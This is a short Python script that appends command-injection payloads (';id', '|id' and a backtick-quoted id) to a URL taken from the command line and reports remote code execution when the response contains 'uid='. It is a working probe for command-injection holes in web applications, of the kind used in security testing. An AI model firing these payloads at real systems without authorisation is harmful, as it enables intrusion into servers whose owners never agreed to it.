import requests
import sys

payloads = ['; id', '| id', '`id`']

for p in payloads:
    if 'uid=' in requests.get(sys.argv[1] + p).text:
        print(f'[VULN] RCE: {p}')
